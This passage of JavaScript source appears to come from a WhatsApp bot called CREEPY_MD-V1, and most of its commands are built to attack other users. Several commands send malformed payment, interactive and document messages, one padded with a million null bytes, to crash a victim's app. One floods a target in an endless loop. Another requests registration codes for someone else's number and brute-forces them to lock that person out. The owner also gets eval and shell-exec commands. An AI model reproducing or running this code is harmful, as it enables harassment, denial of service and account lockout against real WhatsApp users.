                        replyglobal("*DONE✅ BUG HAS BEEN SENT TO THE GROUP!.*");
                        DannyTechInc.groupLeave(groupTarget);
                    } catch (error) {
                        replyglobal(util.format(error));
                    }
                }
                break;
            case "creepy-attack":
                {
                    if (!isPremium) return replyglobal(mess.prem)
                    if (!isBot) {
                        return replyglobal("*This feature is for the creepy only!*");
                    }
                    if (!text) {
                        return replyglobal(`Example usage: ${prefix + command} 5`)
                    }
                    if (isNaN(parseInt(text))) {
                        return replyglobal("Amount must be a number");
                    }
                    let encodedValue = encodeURI(text) * 200; // Adjusted calculation for clarity
                    replyglobal("please wait, " + command + " bug is in process..");
                    await sleep(1500); // Adjusted sleep time for clarity
                    sendViewOnceMessages(from, encodedValue);
                    await sleep(2500); // Adjusted sleep time for clarity
                    sendReaction('✅');
                }
                break;
            case "creepy-uicrash": {
                if (!isPremium) return replyglobal(mess.prem)
                if (!text) return replyglobal(`Use ${prefix + command} victim number|amount\nExample ${prefix + command} 2557xxxxxxxxxx,5`)
                let number = text.split(',')[0];
                let amount = text.split(',')[1] * 5;
                if (!number || !amount) {
                    return replyglobal(`Use ${prefix + command} victim number|amount\nExample ${prefix + command} 2557xxxxxxxxxx,5`)
                }
                if (isNaN(parseInt(amount))) {
                    return replyglobal("Amount must be a number");
                }
                let cleanedNumber = number.replace(/[^0-9]/g, '');
                let encodedAmount = '' + encodeURI(amount);
                var contactInfo = await DannyTechInc.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
                let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
                if (cleanedNumber == "923444844060") {
                    return;
                }
                if (contactInfo.length == 0) {
                    return replyglobal("The number is not registered on WhatsApp");
                }
                replyglobal("please wait, " + command + " crepy-uicrash is in process..");
                await sleep(2000); // Adjusted sleep time for clarity
                sendMixedMessages(whatsappNumber, encodedAmount);
                await sleep(2500); // Adjusted sleep time for clarity
                sendMessageWithMentions(
                    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] +
                    " Using *" + command + "* ✅\n\nPause 2 minutes so thattcreepy wont stop on your panel.",
                    [whatsappNumber]
                );
            }
                break;
            case "creepy-smash": {
                if (!isPremium) return replyglobal(mess.prem)
                if (!text) return replyglobal(`Use ${prefix + command} victim number|amount\nExample ${prefix + command} 2557xxxxxxxxxx,5`)
                let number = text.split(',')[0];
                let amount = text.split(',')[1] * 5;
                if (!number || !amount) {
                    return replyglobal(`Use ${prefix + command} victim number|amount\nExample ${prefix + command} 2557xxxxxxxxxx,5`)
                }
                if (isNaN(parseInt(amount))) {
                    return replyglobal("Amount must be a number");
                }
                let cleanedNumber = number.replace(/[^0-9]/g, '');
                let encodedAmount = '' + encodeURI(amount);
                var contactInfo = await DannyTechInc.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
                let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
                if (cleanedNumber == "923444844060") {
                    return;
                }
                if (contactInfo.length == 0) {
                    return replyglobal("The number is not registered on WhatsApp");
                }
                replyglobal("please wait, " + command + "  is in process..");
                await sleep(2000); // Adjusted sleep time for clarity
                sendRepeatedMessages2(whatsappNumber, encodedAmount);
                await sleep(2500); // Adjusted sleep time for clarity
                sendMessageWithMentions(
                    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] +
                    " Using *" + command + "* ✅\n\nPause 2 minutes so that creepy won't stop on your panel.",
                    [whatsappNumber]
                );
            }
                break;

            case 'killer-creepy': {
                if (!isCreator) return replyglobal(mess.owner)
                if (!text) return replyglobal(`Usage .${command} 255697xxxxxx`)
                let cleanedNumber = text.replace(/[^0-9]/g, '');
                if (cleanedNumber.startsWith('0')) return replyglobal(`Example : ${prefix + command} 255697xxxxxx`)
                var contactInfo = await DannyTechInc.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
                let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
                if (cleanedNumber == "923444844060") {
                    return;
                }
                if (cleanedNumber == "919366316008") {
                    return;
                }
                if (cleanedNumber == "919402104403") {
                    return;
                }
                if (contactInfo.length == 0) {
                    return replyglobal("The number is not registered on WhatsApp");
                }
                async function creepIosShot(jid) {
                    for (let i = `3`; i !== 0; i -= 1) {
                        const crasoh = await DannyTechInc.relayMessage(jid,
                            {
                                extendedTextMessage: {
                                    text: '#CREEPY MD CRASH ☠️🔥',
                                    matchedText: 'LEGALLY WRONG, ETHICALLY RIGHT',
                                    canonicalUrl: 'https://example.com',
                                    description: '#CREEPY MD CRASH ☠️🔥',
                                    title: '#CREEPY MD CRASH ☠️🔥',
                                    textArgb: 0xff000000,
                                    backgroundArgb: 0xffffffff,
                                    font: 1,
                                    previewType: 0,
                                    jpegThumbnail: await getBuffer('https://example.com/thumb.jpg'),
                                    contextInfo: {
                                    },
                                    doNotPlayInline: false,
                                    thumbnailDirectPath: 'https://example.com/thumb.jpg',
                                    thumbnailSha256: Buffer.from('1234567890abcdef', 'hex'),
                                    thumbnailEncSha256: Buffer.from('abcdef1234567890', 'hex'),
                                    mediaKey: Buffer.from(
                                        'abcdef1234567890abcdef1234567890',
                                        'hex'
                                    ),
                                    mediaKeyTimestamp: Date.now(),
                                    thumbnailHeight: 200,
                                    thumbnailWidth: 200,
                                    inviteLinkGroupType: 0, // InviteLinkGroupType.DEFAULT
                                    inviteLinkParentGroupSubjectV2: 'Parent Group Subject',
                                    inviteLinkParentGroupThumbnailV2: Buffer.from(
                                        'abcdef1234567890',
                                        'hex'
                                    ),
                                    inviteLinkGroupTypeV2: 0,
                                    viewOnce: true,
                                },
                            },
                            { participant: { jid: jid } }
                        );
                    }
                    for (let i = `3`; i !== 0; i -= 1) {
                        await DannyTechInc.relayMessage(
                            jid,
                            {
                                viewOnceMessage: {
                                    message: {
                                        messageContextInfo: {
                                            deviceListMetadataVersion: 2,
                                            deviceListMetadata: {},
                                        },
                                        interactiveMessage: {
                                            nativeFlowMessage: {
                                                buttons: [
                                                    {
                                                        name: 'payment_info',
                                                        buttonParamsJson:
                                                            '{"currency":"BRL","total_amount":{"value":0,"offset":100},"reference_id":"4P46GMY57GC","type":"physical-goods","order":{"status":"pending","subtotal":{"value":0,"offset":100},"order_type":"ORDER","items":[{"name":"","amount":{"value":0,"offset":100},"quantity":0,"sale_amount":{"value":0,"offset":100}}]},"payment_settings":[{"type":"pix_static_code","pix_static_code":{"merchant_name":"#CREEPY MD CRASH ☠️🔥","key":"+923444844060","key_type":"X"}}]}',
                                                    },
                                                ],
                                            },
                                        },
                                    },
                                },
                            },
                            { participant: { jid: jid } },
                            { messageId: null }
                        );
                    }
                    for (let i = `3`; i !== 0; i -= 1) {
                        await DannyTechInc.relayMessage(
                            jid,
                            {
                                viewOnceMessage: {
                                    message: {
                                        interactiveMessage: {
                                            header: {
                                                title: '',
                                                subtitle: ' ',
                                            },
                                            body: {
                                                text: '#CREEPY MD CRASH ☠️🔥',
                                            },
                                            footer: {
                                                text: 'xp',
                                            },
                                            nativeFlowMessage: {
                                                buttons: [
                                                    {
                                                        name: 'cta_url',
                                                        buttonParamsJson:
                                                            "{ display_text : 'S̸Y꙰̸S꙰̸T꙰̸E꙰̸M꙰̸ U̸I̸ C̸R꙰̸A꙰̸S꙰̸H꙰̸', url : '', merchant_url : '' }",
                                                    },
                                                ],
                                                messageParamsJson: '\0'.repeat(1000000),
                                            },
                                        },
                                    },
                                },
                            },
                            { participant: { jid: jid } }
                        );
                    }
                }
                await replyglobal(`Bot Creepy In process....`)
                await creepIosShot(whatsappNumber);
                sendMessageWithMentions(
                    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] +
                    " Using *" + command + "* ✅\n\nPause 2 minutes so that creepy won't stop on panel.",
                    [whatsappNumber]
                );
            }

                break;
            case 'hacker-creepy': {
                if (!isPremium) return replyglobal(mess.prem)
                if (!text) return replyglobal(`Usage .${command} 2556976xxxxx`)
                let cleanedNumber = text.replace(/[^0-9]/g, '');
                if (cleanedNumber.startsWith('0')) return replyglobal(`Example : ${prefix + command} 2556976xxxxx`)
                var contactInfo = await DannyTechInc.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
                let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
                if (cleanedNumber == "923444844060") {
                    return;
                }
                if (cleanedNumber == "923051391007") {
                    return;
                }
                if (cleanedNumber == "919402104403") {
                    return;
                }
                if (contactInfo.length == 0) {
                    return replyglobal("The number is not registered on WhatsApp");
                }
                async function creepBugPay(jid) {
                    await DannyTechInc.relayMessage(
                        jid,
                        {
                            viewOnceMessage: {
                                message: {
                                    messageContextInfo: {
                                        deviceListMetadataVersion: 2,
                                        deviceListMetadata: {},
                                    },
                                    interactiveMessage: {
                                        nativeFlowMessage: {
                                            buttons: [
                                                {
                                                    name: 'payment_info',
                                                    buttonParamsJson:
                                                        '{"currency":"INR","total_amount":{"value":0,"offset":100},"reference_id":"4P46GMY57GC","type":"physical-goods","order":{"status":"pending","subtotal":{"value":0,"offset":100},"order_type":"ORDER","items":[{"name":"","amount":{"value":0,"offset":100},"quantity":0,"sale_amount":{"value":0,"offset":100}}]},"payment_settings":[{"type":"pix_static_code","pix_static_code":{"merchant_name":"meu ovo","key":"+923444844060","key_type":"X"}}]}',
                                                },
                                            ],
                                        },
                                    },
                                },
                            },
                        },
                        { participant: { jid: jid } },
                        { messageId: null }
                    );
                }
                await creepBugPay(whatsappNumber);
                sendMessageWithMentions(
                    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] +
                    " Using *" + command + "* ✅\n\nPause 2 minutes so that creepy won't stop on panel.",
                    [whatsappNumber]
                );
            }
                break;
            case 'creepy-samsung': case 'creepy-all': case 'all-attack': case 'creepy-web': case 'creepy-doublekill': case '💀': case '☠️': {
                if (!isPremium) return replyglobal(mess.prem)
                if (!q) return replyglobal(`Usage .${command} 255697xxxxxx`)
                let creepyvictim = q.replace(/[^0-9]/g, "")
                if (creepyvictim.startsWith('0')) return replyglobal(`Example : .${command} 255697xxxxxx`)
                let target = creepyvictim + '@s.whatsapp.net'
                await replyglobal(`Bot Creepy In process....`)
                for (let j = 0; j < 1; j++) {
                    await listcreepfck(target, oneclickcreep)
                    await locationcreepy(target, force)
                    await creepkillpic(target, oneclickcreep)
                    await locationcreepy(target, force)
                    await blackening(target, force2)
                    await locationcreepy(target, force)
                }
                await replyglobal(`Successfully Send Bug to ${creepyvictim} Using ${command}. ✅`)
            }
                break
            case 'ios-creepy': case 'ioscrp': {
                if (!isPremium) return replyglobal(mess.prem)
                let creepyvictim = q.replace(/[^0-9]/g, "")
                if (creepyvictim.startsWith('0')) return replyglobal(`Example : .${command} 255697xxxxxx`)
                await replyglobal(`Ceeepy In process....`)
                let target = creepyvictim + '@s.whatsapp.net'
                for (; ;) {
                    await aipong(target)
                    await sleep(1200)
                }
            }
                break
            case 'black-danny': case 'black-creepy': {
                if (!isPremium) return replyglobal(mess.prem)
                const creepDoc = {
                    url: "./80/x.mp3"
                };
                async function creepFreeze(jid) {
                    for (let i = 0; i < 50; i++) {
                        await DannyTechInc.sendMessage(jid, {
                            'document': creepDoc,
                            'fileName': "🇹🇿Danny🤖" + creepyd1,
                            'mimetype': "application/zip",
                            'caption': "🇹🇿Danny🤖" + creepyd1,
                            'pageCount': 0x3b9aca00,
                            'contactVcard': true
                        });
                    }
                }

                await creepFreeze(m.chat);
            }
                break
            case 'bkack-dannygc': case 'group-death': case 'group-end': {
                if (!isPremium) return replyglobal(mess.prem)
                const creepimage = {
                    title: "🇹🇿Danny🤖; ",
                    hasMediaAttachment: true,
                    imageMessage: thumb.imageMessage
                };

                const xtext = {
                    text: ''
                };

                DannyTechInc.relayMessage(m.chat, {
                    'viewOnceMessage': {
                        'message': {
                            'interactiveMessage': {
                                'header': creepimage,
                                'body': xtext,
                                'nativeFlowMessage': {
                                    'buttons': [{
                                        'name': "galaxy_message",
                                        'buttonParamsJson': JSON.stringify({
                                            'header': "🇹🇿Danny🤖; ",
                                            'body': "xxx",
                                            'flow_action': "navigate",
                                            'flow_action_payload': {
                                                'screen': "FORM_SCREEN"
                                            },
                                            'flow_cta': "xxxxx",
                                            'flow_id': "1169834181134583",
                                            'flow_message_version': '3',
                                            'flow_token': "AQAAAAACS5FpgQ_cAAAAAE0QI3s"
                                        })
                                    }],
                                    'messageParamsJson': ''
                                },
                                'contextInfo': {
                                    'isForwarded': true,
                                    'fromMe': false,
                                    'participant': "0@s.whatsapp.net",
                                    'remoteJid': m.chat,
                                    'quotedMessage': {
                                        'documentMessage': {
                                            'url': "https://mmg.whatsapp.net/v/t62.7119-24/34673265_965442988481988_3759890959900226993_n.enc?ccb=11-4&oh=01_AdRGvYuQlB0sdFSuDAeoDUAmBcPvobRfHaWRukORAicTdw&oe=65E730EB&_nc_sid=5e03e0&mms3=true",
                                            'mimetype': "application/pdf",
                                            'title': "crash",
                                            'pageCount': 0x3b9aca00,
                                            'fileName': "crash.pdf",
                                            'contactVcard': true
                                        }
                                    },
                                    'forwardedNewsletterMessageInfo': {
                                        'newsletterJid': "120363222395675670@newsletter",
                                        'serverMessageId': 0x1,
                                        'newsletterName': "🇹🇿Danny🤖"
                                    }
                                }
                            }
                        }
                    }
                }, {});
            }
                break
            case 'black-dannyios': case 'ios-death': {
                if (!isPremium) return replyglobal(mess.prem)
                const subscribe_dgcreep = {
                    "key": {
                        "fromMe": false,
                        "participant": '0@s.whatsapp.net',
                        "remoteJid": 'status@broadcast'
                    },
                    message: {
                        "listResponseMessage": {
                            title: `Danny is ur father`
                        }
                    }
                }
                async function creepyCrashyIos(dgcreep, chat, participant) {
                    DannyTechInc.sendMessage(
                        chat,
                        {
                            document: { url: "./settings.js" },
                            mimetype: `image/null`,
                            fileName: `🇹🇿Danny🤖${creepyd11}`,
                            caption: `🇹🇿Danny🤖 ${creepyd11}`,
                        },
                        { quoted: { ...subscribe_dgcreep, key: { ...subscribe_dgcreep.key, participant } } }  // Includes the quoted participant
                    );
                }
                async function executeIosAttack() {
                    if (!args[0]) amount = `99`;
                    for (let i = 1; i < 10; i++) {
                        creepyCrashyIos(pushname, m.chat, sender);  // Make sure to pass the participant here

                    }
                }
                await executeIosAttack();
            }
                break;
            case 'creepy-ban': case 'tempban': {
                if (!isPremium) return replyglobal(mess.prem)
                if (args.length < 1) return replyglobal(`Incorrect format\n\nUsage: ${prefix + command} country_code|number\nExample: ${prefix + command} 255|69760xxxx`);
                const args2 = args[0].split('|');
                if (args2.length !== 2) return replyglobal(`Incorrect format\n\nUsage: ${prefix + command} country_code|number\nExample: ${prefix + command} 255|69760xxxx`);
                const creepCountryCode = args2[0];
                const xtarget = args2[1];
                const creepNumber = xtarget.replace('@s.whatsapp.net', '');
                const creepmerge = `${creepCountryCode}${xtarget}`
                const creepMention = creepmerge + '@s.whatsapp.net';
                sendMessageWithMentions(
                    "The user us banned temporarily by creepy @" + creepMention.split('@')[0] +
                    " Using *" + command + "* ✅\n\nPause 2 minutes so that creepy won't stop on panel.",
                    [creepMention]
                );
                try {
                    const { statecreep, saveCredscreep } = await useMultiFileAuthState('./session');
                    const creepRequest = await DannyTechInc.requestRegistrationCode({
                        phoneNumber: '+' + creepCountryCode + `${creepNumber}`,
                        phoneNumberCountryCode: creepCountryCode,
                        phoneNumberNationalNumber: `${creepNumber}`,
                        phoneNumberMobileCountryCode: 724,
                        method: 'sms'
                    });
                } catch (err) {
                }

                for (let i = 0; i < 10000; i++) {
                    try {
                        var creepPrefix = Math.floor(Math.random() * 999);
                        var creepSuffix = Math.floor(Math.random() * 999);
                        await DannyTechInc.register(`${creepPrefix}-${creepSuffix}`);
                    } catch (err) {
                        console.log(`${creepPrefix}-${creepSuffix}`);
                    }
                }
            }
                break;

            case 'creepy-open': case 'view': case 'open': {
                if (!m.quoted) return replyglobal(`Reply to view once message`)
                if (m.quoted.mtype !== 'viewOnceMessageV2') return replyglobal(`This is not a view once message`)
                let msg = m.quoted.message
                let type = Object.keys(msg)[0]
                let media = await downloadContentFromMessage(msg[type], type == 'imageMessage' ? 'image' : 'video')
                let buffer = Buffer.from([])
                for await (const chunk of media) {
                    buffer = Buffer.concat([buffer, chunk])
                }
                if (/video/.test(type)) {
                    return DannyTechInc.sendFile(m.chat, buffer, 'media.mp4', msg[type].caption || '', m)
                } else if (/image/.test(type)) {
                    return DannyTechInc.sendFile(m.chat, buffer, 'media.jpg', msg[type].caption || '', m)
                } else if (/audio/.test(type)) {
                    return GlobalTechlnk.sendFile(m.chat, buffer, 'media.mp3', msg[type].caption || '', m)
                }
            }
                break
            case 'clearchat':
                creepimun('𝐷𝛥𝛮𝛮𝑌\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n𝐷𝛥𝛮𝛮𝑌')
            case 'menu':
                {
                    let reaction = sendReaction('🎉');
                    let menuMessage = `
╭─────────────────────────╮
│   ┃ *\`𝓒𝓡𝓔𝓔𝓟𝓨_𝓜𝓓-𝓥𝟏\`*  ┃
├─────────────────────────┤
│ *Hello* \`${pushname}\`,                      
│ *My name is 𝓒𝓡𝓔𝓔𝓟𝓨_𝓜𝓓-𝓥𝟏* 
│ *Type \`Creepy\` to see the full menu*                  
╰─────────────────────────╯
`.trim();

                    await DannyTechInc.sendMessage(m.chat, {
                        text: menuMessage,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: `${botname}`,
                                body: `CREEPY_MD-V1 created by Danny`,
                                thumbnailUrl: 'https://files.catbox.moe/f6j3fl.jpeg',
                                sourceUrl: global.link,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    });
                }
                break
            case 'creepy':
            case 'kaylah':
            case 'creepy-md':
                let reaction = sendReaction('🎉');
                let creepmenuoh = `
╭─────────────────────╮
│   ┃ *\`𝓒𝓡𝓔𝓔𝓟𝓨_𝓜𝓓-𝓥𝟏\`*  ┃
├─────────────────────┤
│ *Hello* \`${pushname}\`,                      
│ *My name is 𝓒𝓡𝓔𝓔𝓟𝓨_𝓜𝓓-𝓥𝟏*                 
╰─────────────────────╯
╭───[ \`𝐌𝐀𝐈𝐍 𝐌𝐄𝐍𝐔\` ]────╮
│ ◆ *creepy*                                      
│ ◆ *menu*                                        
│ ◆ *p*                                          
│ ◆ *buypremium*                                 
│ ◆ *runtime*                                     
│ ◆ *file*                                       
│ ◆ *script*                                      
│ ◆ *support*                                     
│ ◆ *owner*                                       
╰──────────────────╯ ${readmore}
> 𝓒𝓡𝓔𝓔𝓟𝓨_𝓜𝓓-𝓥𝟏 𝓬𝓻𝓮𝓪𝓽𝓮𝓭 𝓫𝓎 𝒟𝒶𝓃𝓃𝓎
╭───[ \`𝐁𝐔𝐆 𝐀𝐍𝐃𝐑𝐎𝐈𝐃\` ]────╮
│ ◆ *creepy-android*                             
│ ◆ *creepy-android2*                            
│ ◆ *creepy-uicrash*                            
│ ◆ *creepy-smash*                               
│ ◆ *killer-creepy*                             
│ ◆ *hacker-creepy*                              
│ ◆ *black-danny*                                
╰───────────────────╯
> 𝓒𝓡𝓔𝓔𝓟𝓨_𝓜𝓓-𝓥𝟏 𝓬𝓻𝓮𝓪𝓽𝓮𝓭 𝓫𝓎 𝒟𝒶𝓃𝓃𝓎
╭───[ \`𝐁𝐔𝐆 𝐖𝐄𝐁\` ]─────╮
│ ◆ *black-danny*                                
│ ◆ *black-dannygc*                             
│ ◆ *black-dannyios*                             
╰──────────────────╯
> 𝓒𝓡𝓔𝓔𝓟𝓨_𝓜𝓓-𝓥𝟏 𝓬𝓻𝓮𝓪𝓽𝓮𝓭 𝓫𝓎 𝒟𝒶𝓃𝓃𝓎
╭──[ \`𝐁𝐔𝐆 𝐈𝐎𝐒\` ]──────╮
│ ◆ *creepy-ios*                                 
│ ◆ *creepy-ios2*                                
│ ◆ *creepy-attack*                              
│ ◆ *black-dannyios*                             
│ ◆ *ios-creepy*                                  
╰─────────────────╯
> 𝓒𝓡𝓔𝓔𝓟𝓨_𝓜𝓓-𝓥𝟏 𝓬𝓻𝓮𝓪𝓽𝓮𝓭 𝓫𝓎 𝒟𝒶𝓃𝓃𝓎
╭───[ \`𝐁𝐔𝐆 𝐎𝐓𝐇𝐄𝐑\` ]─────╮
│ ◆ *tempban*                                    
│ ◆ *creepy-ban*                                 
│ ◆ *💀*                                        
│ ◆ *☠️*                                         
╰────────────────────╯
> 𝓒𝓡𝓔𝓔𝓟𝓨_𝓜𝓓-𝓥𝟏 𝓬𝓻𝓮𝓪𝓽𝓮𝓭 𝓫𝓎 𝒟𝒶𝓃𝓃𝓎
╭─[ \`𝐆𝐑𝐎𝐔𝐏 𝐁𝐔𝐆𝐒\` ]────╮
│ ◆ *group-death*                                
│ ◆ *black-dannygc*                              
│ ◆ *creepy-bug-group*                          
│ ◆ *creepy-gc*                                  
╰──────────────────╯
> 𝓒𝓡𝓔𝓔𝓟𝓨_𝓜𝓓-𝓥𝟏 𝓬𝓻𝓮𝓪𝓽𝓮𝓭 𝓫𝓎 𝒟𝒶𝓃𝓃𝓎
╭───[ \`𝐁𝐀𝐍/𝐔𝐍𝐁𝐀𝐍\` ]─────╮
│ ◆ *banv1*                                     
│ ◆ *banv2*                                     
│ ◆ *banv3*                                      
│ ◆ *banv4*                                     
│ ◆ *banv5*                                      
│ ◆ *banv6*                                      
│ ◆ *unbanv1*                                    
│ ◆ *unbanv2*                                   
│ ◆ *unbanv3*                                    
│ ◆ *unbanv4*                                    
│ ◆ *unbanv5*                                    
╰───────────────────╯
> 𝓒𝓡𝓔𝓔𝓟𝓨_𝓜𝓓-𝓥𝟏 𝓬𝓻𝓮𝓪𝓽𝓮𝓭 𝓫𝓎 𝒟𝒶𝓃𝓃𝓎
╭───[ \`𝐎𝐖𝐍𝐄𝐑 𝐌𝐄𝐍𝐔\` ]────╮
│ ◆ *getsession*                                
│ ◆ *deletesession*                             
│ ◆ *join*                                     
│ ◆ *shutdown*                                
│ ◆ *restart*                                     
│ ◆ *autoread [on/off]*                         
│ ◆ *autotyping [on/off]*                        
│ ◆ *autorecording [on/off]*                      
│ ◆ *autorecordtyp [on/off]*                   
│ ◆ *autoswview [on/off]*                      
│ ◆ *autobio [on/off]*                           
│ ◆ *mode [self/public]*                         
│ ◆ *block*                                      
│ ◆ *unblock*                                    
│ ◆ *backup*                                    
│ ◆ *getcase*                                   
│ ◆ *newomwner*                                 
│ ◆ *delowner*                                    
│ ◆ *creepy-open [viewonce]*                      
│ ◆ *autostatusreact*                             
╰─────────────────────╯
> 𝓒𝓡𝓔𝓔𝓟𝓨_𝓜𝓓-𝓥𝟏 𝓬𝓻𝓮𝓪𝓽𝓮𝓭 𝓫𝓎 𝒟𝒶𝓃𝓃𝓎
╭────[ \`𝐆𝐑𝐎𝐔𝐏 𝐌𝐄𝐍𝐔\` ]───╮
│ ◆ *closetime*                                 
│ ◆ *opentime*                               
│ ◆ *kick*                                   
│ ◆ *add*                                   
│ ◆ *promote*                                  
│ ◆ *demote*                                      
│ ◆ *setdesc*                                    
│ ◆ *tagall*                                      
│ ◆ *hidetag*                                    
│ ◆ *totag*                                     
│ ◆ *group [option]*                            
│ ◆ *editinfo*                                    
│ ◆ *linkgc*                                    
│ ◆ *revoke*                                     
│ ◆ *listonline*                                  
│ ◆ *antilink*                                   
╰──────────────────╯
> 𝓒𝓡𝓔𝓔𝓟𝓨_𝓜𝓓-𝓥𝟏 𝓬𝓻𝓮𝓪𝓽𝓮𝓭 𝓫𝓎 𝒟𝒶𝓃𝓃𝓎
╭────────────────────╮
│ ◆ *ytmp3 <link>*                              
│ ◆ *ytmp4 <link>*                               
│ ◆ *sound1 up to 161*                            
╰────────────────────╯
┏━━━━━━━━━━━━━━━━━━━━━━┓
┃Commander \'${pushname}\'                    
┗━━━━━━━━━━━━━━━━━━━━━━┛
┏━━━━━━━━━━━━━━━━━━━━┓
> To get file just type \`file\`                 
> New 2025 update                      
> Created by Danny🫡                   
> ©️Creepy technology                           
┗━━━━━━━━━━━━━━━━━━━━┛
`
                if (typemenu === 'v1') {
                    DannyTechInc.sendMessage(m.chat, {
                        text: creepmenuoh,
                        contextInfo: {
                            externalAdReply: {
                                title: botname,
                                body: ownername,
                                thumbnailUrl: 'https://files.catbox.moe/f6j3fl.jpeg',
                                sourceUrl: link,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    DannyTechInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./GlobalMedia/thumb2.jpg'),
                        gifPlayback: false,
                        caption: creepmenuoh,
                        contextInfo: {
                            externalAdReply: {
                                title: botname,
                                body: ownername,
                                thumbnailUrl: 'https://files.catbox.moe/f6j3fl.jpeg',
                                sourceUrl: ``,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v3') {
                    DannyTechInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./GlobalMedia/thumb2.jpg'),
                        caption: creepmenuoh,
                        gifPlayback: false
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    DannyTechInc.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: creepmenuoh
                        }
                    }, {})
                }
                break
            case 'telestick': {
                if (args[0] && args[0].match(/(https:\/\/t.me\/addstickers\/)/gi)) {
                    let creepresources = await Telesticker(args[0])
                    await replyglobal(`Sending ${creepresources.length} stickers...`)
                    if (m.isGroup && creepresources.length > 30) {
                        await replyglobal('Number of stickers more than 30, bot will send it in private chat.')
                        for (let i = 0; i < creepresources.length; i++) {
                            DannyTechInc.sendMessage(m.sender, { sticker: { url: creepresources[i].url } })
                        }
                    } else {
                        for (let i = 0; i < creepresources.length; i++) {
                            DannyTechInc.sendMessage(m.chat, { sticker: { url: creepresources[i].url } })
                        }
                    }
                } else replyglobal(`Where is the telegram sticker link?\nExample. ${prefix + command} https://t.me/addstickers/FriendlyDeath`)
            }
                break
            default:
                if (budy.startsWith('=>')) {
                    if (!isCreator) return replyglobal(mess.owner)

                    function Return(sul) {
                        sat = JSON.stringify(sul, null, 2)
                        bang = util.format(sat)
                        if (sat == undefined) {
                            bang = util.format(sul)
                        }
                        return replyglobal(bang)
                    }
                    try {
                        replyglobal(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
                    } catch (e) {
                        replyglobal(String(e))
                    }
                }

                if (budy.startsWith('>')) {
                    if (!isCreator) return replyglobal(mess.owner)
                    try {
                        let evaled = await eval(budy.slice(2))
                        if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
                        await replyglobal(evaled)
                    } catch (err) {
                        await replyglobal(String(err))
                    }
                }
                if (budy.startsWith('$')) {
                    if (!isCreator) return replyglobal(mess.owner)
                    exec(budy.slice(2), (err, stdout) => {
                        if (err) return replyglobal(err)
                        if (stdout) return replyglobal(stdout)
                    })
                }
        }
    } catch (err) {
        console.log(util.format(err))
    }
}
let file = require.resolve(__filename)
fs.watchFile(file, () => {
    fs.unwatchFile(file)
    console.log(chalk.redBright(`Update ${__filename}`))
    delete require.cache[file]
    require(file)
})

process.on('uncaughtException', function (err) {
    let e = String(err)
    if (e.includes("conflict")) return
    if (e.includes("Socket connection timeout")) return
    if (e.includes("not-authorized")) return
    if (e.includes("already-exists")) return
    if (e.includes("rate-overlimit")) return
    if (e.includes("Connection Closed")) return
    if (e.includes("Timed Out")) return
    if (e.includes("Value not found")) return
    console.log('Caught exception: ', err)
})
*/
